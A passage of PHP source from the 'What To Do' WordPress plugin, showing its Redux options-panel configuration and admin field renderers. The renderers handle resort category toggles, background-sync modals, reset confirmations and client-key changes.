                        array(
                            'id' => 'company_zip',
                            'type'     => 'text',
                            'title'    => 'ZIP Code',
                            'validate' => 'numeric',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
                        array(
                            'id' => 'company_phone',
                            'type'     => 'text',
                            'title'    => 'Phone',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
                        array(
                            'id' => 'company_cell',
                            'type'     => 'text',
                            'title'    => 'Cell Phone'
                        ),
                        array(
                            'id' => 'company_fax',
                            'type'     => 'text',
                            'title'    => 'Fax'
                        ),
                        array(
                            'id' => 'company_email',
                            'type'     => 'text',
                            'title'    => 'E-mail Address',
                            'validate' => 'email',
                            'validate' => 'not_empty',
                            'compiler' => true
                        ),
                        array(
                            'id' => 'primary_resort',
                            'type' => 'select',
                            'title' => 'Primary Resort',
                            'options' => $resorts_active
                        )
                    )
                );
            }
            if ( file_exists( trailingslashit( dirname( __FILE__ ) ) . 'README.html' ) ) {
                $tabs['docs'] = array(
                    'icon'    => 'el-icon-book',
                    'title'   => __( 'Documentation', 'wtd-admin' ),
                    'content' => nl2br( file_get_contents( trailingslashit( dirname( __FILE__ ) ) . 'README.html' ) )
                );
            }
        }

        public function setHelpTabs() {

            // Custom page help tabs, displayed using the help API. Tabs are shown in order of definition.
            $this->args['help_tabs'][] = array(
                'id'      => 'redux-help-tab-1',
                'title'   => __( 'Theme Information 1', 'wtd-admin' ),
                'content' => __( '<p>This is the tab content, HTML is allowed.</p>', 'wtd-admin' )
            );

            $this->args['help_tabs'][] = array(
                'id'      => 'redux-help-tab-2',
                'title'   => __( 'Theme Information 2', 'wtd-admin' ),
                'content' => __( '<p>This is the tab content, HTML is allowed.</p>', 'wtd-admin' )
            );

            // Set the help sidebar
            $this->args['help_sidebar'] = __( '<p>This is the sidebar content, HTML is allowed.</p>', 'wtd-admin' );
        }

        /**
         * All the possible arguments for Redux.
         * For full documentation on arguments, please refer to: https://github.com/ReduxFramework/ReduxFramework/wiki/Arguments
         * */
        public function setArguments() {

            $theme = wp_get_theme(); // For use with some settings. Not necessary.

            $this->args = array(
                // TYPICAL -> Change these values as you need/desire
                'opt_name'             => 'wtd_plugin',
                // This is where your data is stored in the database and also becomes your global variable name.
                'display_name' => '<div style="float:left;margin-right: 20px;"><img src="'.WTD_PLUGIN_URL.'/assets/img/whattodo-logo.png" style="float:left;" /></div><br/>',
                'display_version' => '<span style="margin-top:50px;float:right;font-size: 12px;">version '.WTD_VERSION.'</span>',
                'menu_type'            => 'menu',
                //Specify if the admin menu should appear or not. Options: menu or submenu (Under appearance only)
                'allow_sub_menu'       => true,
                // Show the sections below the admin menu item or not
                'menu_title'           => __( 'What To Do', 'wtd-plugin' ),
                'page_title'           => __( 'What To Do', 'wtd-plugin' ),
                // You will need to generate a Google API key to use this feature.
                // Please visit: https://developers.google.com/fonts/docs/developer_api#Auth
                'google_api_key'       => '',
                // Set it you want google fonts to update weekly. A google_api_key value is required.
                'google_update_weekly' => false,
                // Must be defined to add google fonts to the typography module
                'async_typography'     => false,
                // Use a asynchronous font on the front end or font string
                'disable_google_fonts_link' => true,                    // Disable this in case you want to create your own google fonts loader
                'admin_bar'            => false,
                // Show the panel pages on the admin bar
                'admin_bar_icon'     => false,
                // Choose an icon for the admin bar menu
                'admin_bar_priority' => 50,
                // Choose an priority for the admin bar menu
                'global_variable'      => '',
                // Set a different name for your global variable other than the opt_name
                'dev_mode'             => false,
                // Show the time the page took to load, etc
                'update_notice'        => false,
                // If dev_mode is enabled, will notify developer of updated versions available in the GitHub Repo
                'customizer'           => false,
                // Enable basic customizer support
                //'open_expanded'     => true,                    // Allow you to start the panel in an expanded way initially.
                'disable_save_warn' => false,                    // Disable the save warning when a user changes a field

                // OPTIONAL -> Give you extra features
                'page_priority'        => null,
                // Order where the menu appears in the admin area. If there is any conflict, something will not show. Warning.
                'page_parent'          => 'themes.php',
                // For a full list of options, visit: http://codex.wordpress.org/Function_Reference/add_submenu_page#Parameters
                'page_permissions'     => 'manage_options',
                // Permissions needed to access the options panel.
                'menu_icon'            => WTD_PLUGIN_URL.'assets/img/wtd_magnifying_glass_20px.png',
                // Specify a custom URL to an icon
                'last_tab'             => '',
                // Force your panel to always open to a specific tab (by id)
                'page_icon'            => 'icon-themes',
                // Icon displayed in the admin panel next to your menu_title
                'page_slug'            => 'wtd_plugin_settings',
                // Page slug used to denote the panel
                'save_defaults'        => true,
                // On load save the defaults to DB before user clicks save or not
                'default_show'         => false,
                // If true, shows the default value next to each field that is not the default value.
                'default_mark'         => '',
                // What to print by the field's title if the value shown is default. Suggested: *
                'show_import_export'   => false,
                // Shows the Import/Export panel when not used as a field.

                // CAREFUL -> These options are for advanced use only
                'transient_time'       => 60 * MINUTE_IN_SECONDS,
                'output'               => false,
                // Global shut-off for dynamic CSS output by the framework. Will also disable google fonts output
                'output_tag'           => false,
                // Allows dynamic CSS to be generated for customizer and google fonts, but stops the dynamic CSS from going to the head
                // 'footer_credit'     => '',                   // Disable the footer credit of Redux. Please leave if you can help it.

                // FUTURE -> Not in use yet, but reserved or partially implemented. Use at your own risk.
                'database'             => '',
                // possible: options, theme_mods, theme_mods_expanded, transient. Not fully functional, warning!
                'system_info'          => false,
                // REMOVE

                // HINTS
                'hints'                => array(
                    'icon'          => 'icon-question-sign',
                    'icon_position' => 'right',
                    'icon_color'    => 'lightgray',
                    'icon_size'     => 'normal',
                    'tip_style'     => array(
                        'color'   => 'light',
                        'shadow'  => true,
                        'rounded' => false,
                        'style'   => '',
                    ),
                    'tip_position'  => array(
                        'my' => 'top left',
                        'at' => 'bottom right',
                    ),
                    'tip_effect'    => array(
                        'show' => array(
                            'effect'   => 'slide',
                            'duration' => '500',
                            'event'    => 'mouseover',
                        ),
                        'hide' => array(
                            'effect'   => 'slide',
                            'duration' => '500',
                            'event'    => 'click mouseleave',
                        ),
                    ),
                )
            );


            // SOCIAL ICONS -> Setup custom links in the footer for quick links in your panel footer icons.
            $this->args['share_icons'][] = array(
                'url'   => 'https://github.com/WhatToDoInfo/whattodo',
                'title' => 'Visit us on GitHub',
                'icon'  => 'el-icon-github'
                //'img'   => '', // You can use icon OR img. IMG needs to be a full URL.
            );
            $this->args['share_icons'][] = array(
                'url'   => 'https://www.facebook.com/whattodoaspenglenwood',
                'title' => 'Like us on Facebook',
                'icon'  => 'el-icon-facebook'
            );
            $this->args['share_icons'][] = array(
                'url'   => 'https://twitter.com/WhatToDoVail',
                'title' => 'Follow us on Twitter',
                'icon'  => 'el-icon-twitter'
            );
            $this->args['share_icons'][] = array(
                'url'   => 'https://www.linkedin.com/company/1551382',
                'title' => 'Find us on LinkedIn',
                'icon'  => 'el-icon-linkedin'
            );

            // Panel Intro text -> before the form
            if ( ! isset( $this->args['global_variable'] ) || $this->args['global_variable'] !== false ) {
                if ( ! empty( $this->args['global_variable'] ) ) {
                    $v = $this->args['global_variable'];
                } else {
                    $v = str_replace( '-', '_', $this->args['opt_name'] );
                }
            } else {
                $this->args['intro_text'] = '';
            }

            // Add content after the form.
            $this->args['footer_text'] =__( '<p>For more information checkout <a href="support.whattodo.info">support.whattodo.info</a></p>', 'wtd-admin' );
        }

        public function validate_callback_function( $field, $value, $existing_value ) {
            $error = true;
            $value = 'just testing';

            /*
          do your validation

          if(something) {
            $value = $value;
          } elseif(something else) {
            $error = true;
            $value = $existing_value;

          }
         */

            $return['value'] = $value;
            $field['msg']    = 'your custom error message';
            if ( $error == true ) {
                $return['error'] = $field;
            }

            return $return;
        }

        public function class_field_callback( $field, $value ) {
            print_r( $field );
            echo '<br/>CLASS CALLBACK';
            print_r( $value );
        }

    }

    global $wtd_redux_config;
    $wtd_redux_config = new wtd_redux_config();
} else {
    echo "The class named Redux_Framework_sample_config has already been called. <strong>Developers, you need to prefix this class with your company name or you'll run into problems!</strong>";
}

/**
 * Custom function for the callback referenced above
 */
if ( ! function_exists( 'redux_my_custom_field' ) ):
    function redux_my_custom_field( $field, $value ) {
        print_r( $field );
        echo '<br/>';
        print_r( $value );
    }
endif;

/**
 * Custom function for the callback validation referenced above
 * */
if ( ! function_exists( 'redux_validate_callback_function' ) ):
    function redux_validate_callback_function( $field, $value, $existing_value ) {
        $error = true;
        $value = 'just testing';

        /*
      do your validation

      if(something) {
        $value = $value;
      } elseif(something else) {
        $error = true;
        $value = $existing_value;

      }
     */

        $return['value'] = $value;
        $field['msg']    = 'your custom error message';
        if ( $error == true ) {
            $return['error'] = $field;
        }

        return $return;
    }
endif;

function wtd_hidden_pages($fields,$value){
    $opt = get_option('wtd_terms_synced');
    $wtd_reseting = get_option('wtd_reseting');
    $wtd_sync = get_option('wtd_syncing');
    $options = get_option('wtd_plugin');
    global $wtd_modal;
    global $wtd_syncing;
    wp_enqueue_media();
    add_thickbox();
    if (!empty($opt) || $wtd_reseting || $wtd_sync):

        ?>
        <div id="wtd_modal_stop" style="display:none;">
            <img src="<?php echo WTD_PLUGIN_URL.'/assets/img/wtd_wait.gif';?>"/>
            <p>
                There is a process running in the background!<br/>
                You cannot change any settings right now!<br/>
                The window may refresh several times until the process ends.
            </p>
        </div>
        <script>
            var wtd_start_sync = false;
            function wtd_check_background(){
                jQuery.ajax({
                    type: 'POST',
                    data: {
                        action: 'wtd_start_sync'
                    },
                    url : ajaxurl,
                    success:function(data){
                        var response = jQuery.parseJSON(data);
                        if(typeof response == 'object'){
                            wtd_check_background();
                        }else{
                            window.location = "<?php echo admin_url('/admin.php?page=wtd_plugin_settings');?>";
                        }
                    },
                    error: function(jqXHR,textStatus,errorThrown){
                        window.location = "<?php echo admin_url('/admin.php?page=wtd_plugin_settings');?>";
                    }
                });
            }
            jQuery(window).load(function(){
                <?php if (!$wtd_modal):?>
                tb_show("",'#TB_inline?width=310&height=270&inlineId=wtd_modal_stop');
                jQuery('.redux-action_bar input,.redux-action_bar a').hide();
                <?php if (!$wtd_syncing): ?>
                if (!wtd_start_sync)
                    wtd_check_background();
                <?php endif;?>
                <?php endif;?>
            });
        </script>
    <?php endif; ?>

    <script>
        jQuery(document).ready(function(){

            jQuery(document).on('click','#wtd_plugin-wtd_menu_generator .ui-corner-right',function(){
                if (jQuery(this).hasClass('ui-state-active'))
                    alert('Disabling this will not prevent the "Auto add pages" Wordpress menu option');
            });
            jQuery('#client_identifier').parent().parent().remove();
            <?php if (!$opt && !$wtd_reseting || !empty($wtd_syncing)): ?>
            var reset_button = jQuery('<a href="<?php echo admin_url('admin.php?page=wtd_plugin_settings&wtd_pre_reset=1');?>" class="button wtd_reseter">Reset All</a>');
            jQuery('.wtd_reseter').click(function(event){
                event.preventDefault();
                if (confirm('Are you sure you want to reset the plug-in? This will erase all the existing data!')) {
                    var href = jQuery(this).attr('href');
                    window.location = href;
                } else {
                    // Do nothing!
                }
            });
            jQuery('.wtd_hard_reseter').click(function(event){
                event.preventDefault();
                if (confirm('Are you sure you want to reset the plug-in? This will erase all the existing data, including your settings!')) {
                    var href = jQuery(this).attr('href');
                    window.location = href;
                } else {
                    // Do nothing!
                }
            });
            <?php else: ?>
            jQuery('.redux-action_bar input').hide();
            <?php endif;?>
            <?php if (!empty($options['business_category'])): ?>
            jQuery('.resort_flag[data-place="business_categories_options"]').parent().parent().parent().css('display','table-row');
            <?php endif; ?>
            jQuery('.wtd_reloader').click(function(event){
                event.preventDefault();
                var type = jQuery(this).attr('data-type');
                var page = jQuery(this).attr('data-page');
                jQuery('.redux-action_bar').remove();
                jQuery.ajax({
                    type: "POST",
                    data: {
                        action: "wtd_update_single_feed",
                        key: type
                    },
                    url: ajaxurl,
                    beforeSend: function(){
                        tb_show("", '#TB_inline?width=310&height=270&inlineId=wtd_modal_reload');
                    },
                    success: function(data){
                        window.location = "<?php echo admin_url('/admin.php?page=wtd_plugin_settings');?>";
                    },
                    error: function(jqXHR,textStatus,errorThrown){
                        window.location = "<?php echo admin_url('/admin.php?page=wtd_plugin_settings');?>";
                    }
                });
//                    window.location = "<?php //echo admin_url('admin.php?page=wtd_plugin_settings&wtd_reload=');?>//"+type+'&wtd_page='+page;

            });
        });
    </script>
    <?php
    $res_query = get_terms('wtd_resort',array('hide_empty' => false));
    if (!count($res_query) || is_wp_error($res_query)):
        ?>
        <script>
            jQuery(document).ready(function(){
                jQuery( document ).on( 'change', '.redux-field input, .redux-field textarea, .redux-field select', function() {
                    if ( !jQuery( this ).hasClass( 'noUpdate' ) ) {
                        window.onbeforeunload = null;
                    }
                });
            });
        </script>
    <?php
    endif;
    ?>

    <div id="wtd_change_key" style="display:none;">
        <p style="margin-top:70px;">
            Please enter your new Client Key:
        </p>
        <input type="text" id="wtd_new_key" style="float:left;width:100%;"/>
        <a href="javascript:void(0)" class="button button-primary" id="wtd_new_key_button" style="margin-top:15px;float:right;">Change Client Key</a>
    </div>
    <script>
        jQuery(document).ready(function() {
            jQuery('.wtd_key_changer').click(function (event) {
                event.preventDefault();
                tb_show("", '#TB_inline?width=310&height=270&inlineId=wtd_change_key');

            });
            jQuery('#wtd_new_key_button').click(function(){

                var new_key = jQuery('#wtd_new_key').val();
                if (!new_key)
                    jQuery('#wtd_new_key').focus();
                else
                    window.location = "<?php echo admin_url('/admin.php?page=wtd_plugin_settings&wtd_new_client_key=');?>"+new_key;

            });
        });
    </script>
    <?php
    $transient = get_transient('wtd_change_key_status');
    if (!empty($transient)):

        ?>
        <div id="wtd_change_key_answer" style="display:none;">
            <p style="margin:30px 0px;">
                <?php if ($transient['status']):

                    if ($transient['status'] == 2)
                        $res_message = 'The Client Details have successfully been refreshed.';
                    else
                        $res_message = 'Your Client Key has successfully been changed.';

                    ?>
                    <i class="el-icon-ok" style="color:forestgreen;"></i> <?php echo $res_message; ?>
                <?php else: ?>
                    <i class="el-icon-remove" style="color:red;"></i> <b>Error:</b> <?php echo $transient['messages'][0];?>
                <?php endif; ?>
            </p>
        </div>
        <script>
            jQuery(window).load(function(){
                tb_show("", '#TB_inline?width=310&height=95&inlineId=wtd_change_key_answer');
            });
        </script>

        <?php
        delete_transient('wtd_change_key_status');
    endif;
    ?>
    <div id="wtd_modal_reload" style="display:none;">
        <img src="<?php echo WTD_PLUGIN_URL.'/assets/img/wtd_wait.gif';?>"/>
        <p>
            There is a process running in the background!<br/>
            You cannot change any settings right now!<br/>
            The page will reload as soon as the process ends
        </p>
    </div>
<?php
}

function wtd_activities_pages($field,$value){
    $pages = get_option('wtd_pages');
    foreach ($pages['activities_pages'] as $page){
        if (get_post($page))
            echo '<a href="'.get_permalink($page).'" target="_blank" class="wtd_generated_page">'.get_the_title($page).'</a>';
    }
    if (!count($pages['activities_pages']))
        echo '<p>The pages are generated in the background. Their links will appear here as soon as they are published!</p>';
}

function wtd_act_temp($field, $value){
    global $wpdb;
    $place="activities_options";

    $not_allowed = $wpdb->get_results(
        'SELECT term_id FROM '.$wpdb->prefix.'wtd_meta WHERE meta_key = "cat_id" AND wtd_term_id IN (6,903,1008) LIMIT 3'
    );
    $exclude = array();
    foreach ($not_allowed as $n)
        $exclude[] = $n->term_id;

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['activities'];

    foreach ($exclude as $x)
        unset($cats[$x]);

    foreach ($options['wtd_resorts'] as $resort){
        echo '<div class="category_full resort_hide" data-place="'.$place.'">';
        foreach ($cats as $pcat){
            $cat = $pcat['parent'];
            $cat_enable = 'selected';
            $cat_disable = '';
            if (!empty($options[$place][$resort][$cat->term_id]['parent'])){
                $cat_enable = '';
                $cat_disable = 'selected';
            }
            ?>
            <div id="<?php echo $place.'_';?><?php echo $resort;?>_parent_term_<?php echo $cat->term_id;?>" class="wtd_cat_container">
                <fieldset class="redux-field-container redux-field redux-container-switch" data-id="category-<?php echo $cat->term_id;?>" data-type="switch">
                    <div class="switch-options">
                        <label class="cb-enable <?php echo $cat_enable;?>" data-place="<?php echo $place;?>" data-term="<?php echo $cat->term_id;?>" data-val="1" data-resort="<?php echo $resort;?>">
                            <span>Show</span>
                        </label>
                        <label class="cb-disable <?php echo $cat_disable;?>" data-place="<?php echo $place;?>"  data-term="<?php echo $cat->term_id;?>" data-val="0" data-resort="<?php echo $resort;?>">
                            <span>Hide</span>
                        </label>
                    </div>
                </fieldset>
                <span>Show/Hide "<?php echo $cat->name;?>" Category</span>
                <hr/>
                <h4>Disable individual Subcategories</h4>
                <?php
                $ch = $pcat['children'];
                foreach ($ch as $c){
                    $icon = 'el-icon-check';
                    $class = 'button-primary';
                    if (!empty($options[$place][$resort][$cat->term_id]['children'][$c->term_id]) || !empty($options[$place][$resort][$cat->term_id]['parent'])){
                        $icon = "el-icon-check-empty";
                        $class = '';
                    }
                    echo '<a href="javascript:void(0);" title="'.$c->name.'" data-term="'.$c->term_id.'" data-parent="'.$cat->term_id.'" data-place="'.$place.'" data-resort="'.$resort.'" class="wtd_scat button '.$class.'"><label class="term-count">'.$c->count.'</label><span>'.$c->name.'</span><i class="'.$icon.'"></i></a>';

                }
                ?>
            </div>
        <?php
        }
        echo '</div>';
    }

}

function wtd_activities_options($field, $value){
    global $wpdb;
    $place="activities_options";
    ?>
    <fieldset class="redux-field-container redux-field redux-container-button_set" data-type="button_set">
        <span>Select resort</span>
        <section class="buttonset ui-buttonset wtd_resorts_selector">
            <?php
            $options = get_option('wtd_plugin');
            $right = count($options['wtd_resorts']) - 1;
            foreach ($options['wtd_resorts'] as $key => $resort){
                $rpost = $wpdb->get_row(
                    $wpdb->prepare(
                        'SELECT * FROM '.$wpdb->terms.' WHERE term_id = %d LIMIT 1',
                        $resort
                    )
                );
                if ($key == 0)
                    $bclass = 'ui-corner-left';
                elseif ($key == $right)
                    $bclass = 'ui-corner-right';
                else
                    $bclass = '';
                ?>
                <label class="ui-button ui-widget ui-state-default ui-button-text-only resort_selector <?php echo $bclass;?>" data-resort="<?php echo $resort;?>" data-place="<?php echo $place;?>" role="button" aria-disabled="false">
                    <span class="ui-button-text"><?php echo $rpost->name;?></span>
                </label>
            <?php } ?>
        </section>
        <hr/>
    </fieldset>
    <?php

    $not_allowed = $wpdb->get_results(
        'SELECT term_id FROM '.$wpdb->prefix.'wtd_meta WHERE meta_key = "cat_id" AND wtd_term_id IN (6,903,1008) LIMIT 3'
    );
    $exclude = array();
    foreach ($not_allowed as $n)
        $exclude[] = $n->term_id;

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['activities'];

    foreach ($exclude as $x)
        unset($cats[$x]);

    foreach ($options['wtd_resorts'] as $resort){
        echo '<section id="'.$place.'_'.$resort.'_first" class="resort_hide" data-place="'.$place.'">';
        foreach ($cats as $key => $pcategory){
            $category = $pcategory['parent'];
            $icon = 'el-icon-check';
            if (!empty($options[$place][$resort][$category->term_id]['parent']))
                $icon = 'el-icon-check-empty';
            echo '<a href="javascript:void(0);" class="button wtd_cat" data-place="'.$place.'" data-term="'.$category->term_id.'" data-resort="'.$resort.'"><label class="term-count">'.$category->count.'</label><span>'.$category->name.'</span><i class="'.$icon.'"></i></a>';
        }
        echo '</section>';
    }
    echo '<section id="'.$place.'_inputs">';
    foreach ($options['wtd_resorts'] as $resort){
        if (!empty($options[$place][$resort])){
            foreach ($options[$place][$resort] as $term_id => $val){
                if (!empty($val['parent']))
                    echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$term_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][parent]" value="1"/>';
                if (!empty($val['children']))
                    foreach($val['children'] as $child_id => $child){
                        echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$child_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][children]['.$child_id.']" value="1"/>';
                    }
            }
        }
    }
    echo'</section>';
}

function wtd_map_pages($field,$value){
    $pages = get_option('wtd_pages');
    foreach ($pages['map_pages'] as $page){
        echo '<a href="'.get_permalink($page).'" target="_blank" class="wtd_generated_page">'.get_the_title($page).'</a>';
    }
    if (!count($pages['map_pages']))
        echo '<p>The pages are generated in the background. Their links will appear here as soon as they are published!</p>';
}


function wtd_map_temp($field, $value){
    global $wpdb;
    $place="map_options";

    $not_allowed = $wpdb->get_results(
        'SELECT term_id FROM '.$wpdb->prefix.'wtd_meta WHERE meta_key = "cat_id" AND wtd_term_id IN (6,903,1008) LIMIT 3'
    );
    $exclude = array();
    foreach ($not_allowed as $n)
        $exclude[] = $n->term_id;

    $options = get_option('wtd_plugin');
    foreach ($options['wtd_resorts'] as $resort){
        $cats = get_terms('wtd_category',array('parent' => 0,'post_type' => array('wtd_activity'),'exclude' => $exclude,'cache_domain' => 'wtd_activities_'.$resort,'resorts' => array($resort)));
        echo '<div class="category_full resort_hide" data-place="'.$place.'">';
        foreach ($cats as $cat){
            $cat_enable = 'selected';
            $cat_disable = '';
            if (!empty($options[$place][$resort][$cat->term_id]['parent'])){
                $cat_enable = '';
                $cat_disable = 'selected';
            }
            ?>
            <div id="<?php echo $place.'_';?><?php echo $resort;?>_parent_term_<?php echo $cat->term_id;?>" class="wtd_cat_container">
                <fieldset class="redux-field-container redux-field redux-container-switch" data-id="category-<?php echo $cat->term_id;?>" data-type="switch">
                    <div class="switch-options">
                        <label class="cb-enable <?php echo $cat_enable;?>" data-place="<?php echo $place;?>" data-term="<?php echo $cat->term_id;?>" data-val="1" data-resort="<?php echo $resort;?>">
                            <span>Show</span>
                        </label>
                        <label class="cb-disable <?php echo $cat_disable;?>" data-place="<?php echo $place;?>"  data-term="<?php echo $cat->term_id;?>" data-val="0" data-resort="<?php echo $resort;?>">
                            <span>Hide</span>
                        </label>
                    </div>
                </fieldset>
                <span>Show/Hide "<?php echo $cat->name;?>" Category</span>
                <hr/>
                <h4>Disable individual Subcategories</h4>
                <?php
                $ch = get_terms('wtd_category',array('parent' => $cat->term_id,'post_type' => array('wtd_activity'),'cache_domain' => 'wtd_activities_'.$resort,'resorts' => array($resort)));
                foreach ($ch as $c){
                    $icon = 'el-icon-check';
                    $class = 'button-primary';
                    if (!empty($options[$place][$resort][$cat->term_id]['children'][$c->term_id]) || !empty($options[$place][$resort][$cat->term_id]['parent'])){
                        $icon = "el-icon-check-empty";
                        $class = '';
                    }
                    echo '<a href="javascript:void(0);" title="'.$c->name.'" data-term="'.$c->term_id.'" data-parent="'.$cat->term_id.'" data-place="'.$place.'" data-resort="'.$resort.'" class="wtd_scat button '.$class.'"><label class="term-count">'.$c->count.'</label><span>'.$c->name.'</span><i class="'.$icon.'"></i></a>';

                }
                ?>
            </div>
        <?php
        }
        echo '</div>';
    }
}

function wtd_map_options($field, $value){
    global $wpdb;
    $place="map_options";
    $options = get_option('wtd_plugin');
    ?>
    <fieldset class="redux-field-container redux-field redux-container-button_set" data-type="button_set">
        <span>Select resort</span>
        <section class="buttonset ui-buttonset wtd_resorts_selector">
            <?php
            $right = count($options['wtd_resorts']) - 1;
            foreach ($options['wtd_resorts'] as $key => $resort){
                $rpost = $wpdb->get_row(
                    $wpdb->prepare(
                        'SELECT * FROM '.$wpdb->terms.' WHERE term_id = %d LIMIT 1',
                        $resort
                    )
                );
                if ($key == 0)
                    $bclass = 'ui-corner-left';
                elseif ($key == $right)
                    $bclass = 'ui-corner-right';
                else
                    $bclass = '';
                ?>
                <label class="ui-button ui-widget ui-state-default ui-button-text-only resort_selector <?php echo $bclass;?>" data-resort="<?php echo $resort;?>" data-place="<?php echo $place;?>" role="button" aria-disabled="false">
                    <span class="ui-button-text"><?php echo $rpost->name;?></span>
                </label>
            <?php } ?>
        </section>
        <hr/>
    </fieldset>
    <?php
    $not_allowed = $wpdb->get_results(
        'SELECT term_id FROM '.$wpdb->prefix.'wtd_meta WHERE meta_key = "cat_id" AND wtd_term_id IN (6,903,1008) LIMIT 3'
    );
    $exclude = array();
    foreach ($not_allowed as $n)
        $exclude[] = $n->term_id;
    foreach ($options['wtd_resorts'] as $resort){
        $cats = get_terms('wtd_category',array('parent' => 0,'post_type' => array('wtd_activity'),'exclude' => $exclude,'cache_domain' => 'wtd_activities_'.$resort,'resorts' => array($resort)));
        echo '<section class="wtd_button_grid resort_hide" id="'.$place .'_'.$resort.'_firsst" data-place="'.$place.'">';
        foreach ($cats as $key => $category){
            $icon = 'el-icon-check';
            if (!empty($options[$place][$resort][$category->term_id]['parent']))
                $icon = 'el-icon-check-empty';
            echo '<a href="javascript:void(0);" class="button wtd_cat" data-place="'.$place.'" data-resort="'.$resort.'" data-term="'.$category->term_id.'"><label class="term-count">'.$category->count.'</label><span>'.$category->name.'</span><i class="'.$icon.'"></i></a>';
        }
        echo '</section>';
        echo '<section id="'.$place.'_inputs">';
        if (!empty($value)){
            foreach ($options[$place][$resort] as $term_id => $val){
                if (!empty($val['parent']))
                    echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$term_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][parent]" value="1"/>';
                foreach($val['children'] as $child_id => $child){
                    echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$child_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][children]['.$child_id.']" value="1"/>';
                }
            }
        }
        echo'</section>';
    }
}

function wtd_dining_pages($field,$value){
    $pages = get_option('wtd_pages');
    foreach ($pages['dining_pages'] as $page){
        echo '<a href="'.get_permalink($page).'" target="_blank" class="wtd_generated_page">'.get_the_title($page).'</a>';
    }
    if (!count($pages['dining_pages']))
        echo '<p>The pages are generated in the background. Their links will appear here as soon as they are published!</p>';
}

function wtd_dining_resorts($fields,$value){
	global $wpdb;
    $place = 'dining_options';
    ?>
    <fieldset class="redux-field-container redux-field redux-container-button_set" data-type="button_set">
        <section class="buttonset ui-buttonset wtd_resorts_selector">
            <?php
            $options = get_option('wtd_plugin');
            $right = count($options['wtd_resorts']) - 1;
            foreach ($options['wtd_resorts'] as $key => $resort){
                $rpost = $wpdb->get_row(
                    $wpdb->prepare(
                        'SELECT * FROM '.$wpdb->terms.' WHERE term_id = %d LIMIT 1',
                        $resort
                    )
                );
                if ($key == 0)
                    $bclass = 'ui-corner-left';
                elseif ($key == $right)
                    $bclass = 'ui-corner-right';
                else
                    $bclass = '';
                ?>
                <label class="ui-button ui-widget ui-state-default ui-button-text-only resort_selector <?php echo $bclass;?>" data-resort="<?php echo $resort;?>" data-place="<?php echo $place;?>" role="button" aria-disabled="false">
                    <span class="ui-button-text"><?php echo $rpost->name;?></span>
                </label>
            <?php } ?>
        </section>
    </fieldset>
<?php
}

function wtd_dining_options($field, $value){
    global $wpdb;
    $place="dining_options";
    ?>
    <fieldset class="redux-field-container redux-field redux-container-button_set" data-type="button_set">
        <span>Select resort</span>
        <section class="buttonset ui-buttonset wtd_resorts_selector">
            <?php
            $options = get_option('wtd_plugin');
            $right = count($options['wtd_resorts']) - 1;
            foreach ($options['wtd_resorts'] as $key => $resort){
                $rpost = $wpdb->get_row(
                    $wpdb->prepare(
                        'SELECT * FROM '.$wpdb->terms.' WHERE term_id = %d LIMIT 1',
                        $resort
                    )
                );
                if ($key == 0)
                    $bclass = 'ui-corner-left';
                elseif ($key == $right)
                    $bclass = 'ui-corner-right';
                else
                    $bclass = '';
                ?>
                <label class="ui-button ui-widget ui-state-default ui-button-text-only resort_selector <?php echo $bclass;?>" data-resort="<?php echo $resort;?>" data-place="<?php echo $place;?>" role="button" aria-disabled="false">
                    <span class="ui-button-text"><?php echo $rpost->name;?></span>
                </label>
            <?php } ?>
        </section>
        <hr/>
    </fieldset>
    <?php
    $res_term_id = $wpdb->get_var(
        'SELECT term_id FROM '.$wpdb->prefix.'wtd_meta WHERE meta_key = "cat_id" AND wtd_term_id = 6 LIMIT 1'
    );
    $category = get_term(intval($res_term_id),'wtd_category');
    $options = get_option('wtd_plugin');
    echo '<section id="'.$place.'_inputs">';
    foreach ($options['wtd_resorts'] as $resort){
        if (!empty($options[$place][$resort])){
            foreach($options[$place][$resort][$category->term_id]['children'] as $child_id => $child){
                echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$child_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$category->term_id.'][children]['.$child_id.']" value="1"/>';
            }
        }
    }
    echo'</section>';
    foreach ($options['wtd_resorts'] as $resort){
        $ch = get_terms('wtd_category',array('parent' => $category->term_id,'post_type' => array('wtd_activity'),'cache_domain' => 'wtd_activities_'.$resort,'resorts' => array($resort)));
        echo '<section class="wtd_button_grid resort_hide" id="'.$place.'_'.$resort.'_first" data-place="'.$place.'">';
        foreach ($ch as $c){
            $icon = 'el-icon-check';
            $class = 'button-primary';
            if (!empty($options[$place][$resort][$category->term_id]['children'][$c->term_id])){
                $icon = "el-icon-check-empty";
                $class = '';
            }
            echo '<a href="javascript:void(0);" title="'.$c->name.'" data-term="'.$c->term_id.'" data-parent="'.$category->term_id.'" data-place="'.$place.'" data-resort="'.$resort.'" class="wtd_scat button '.$class.'"><label class="term-count">'.$c->count.'</label><span>'.$c->name.'</span><i class="'.$icon.'"></i></a>';

        }
        echo '</section>';
    }

}

function wtd_calendar_pages($field,$value){
    $pages = get_option('wtd_pages');
    foreach ($pages['calendar_pages'] as $page){
        echo '<a href="'.get_permalink($page).'" target="_blank" class="wtd_generated_page">'.get_the_title($page).'</a>';
    }
    if (!count($pages['calendar_pages']))
        echo '<p>The pages are generated in the background. Their links will appear here as soon as they are published!</p>';
}


function wtd_calendar_temp($field, $value){
    global $wpdb;
    $place="calendar_options";

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['events'];
    foreach ($options['wtd_resorts'] as $resort){
        echo '<div class="category_full resort_hide" data-place="'.$place.'">';
        foreach ($cats as $pcat){
            $cat = $pcat['parent'];
            $cat_enable = 'selected';
            $cat_disable = '';
            if (!empty($options[$place][$resort][$cat->term_id]['parent'])){
                $cat_enable = '';
                $cat_disable = 'selected';
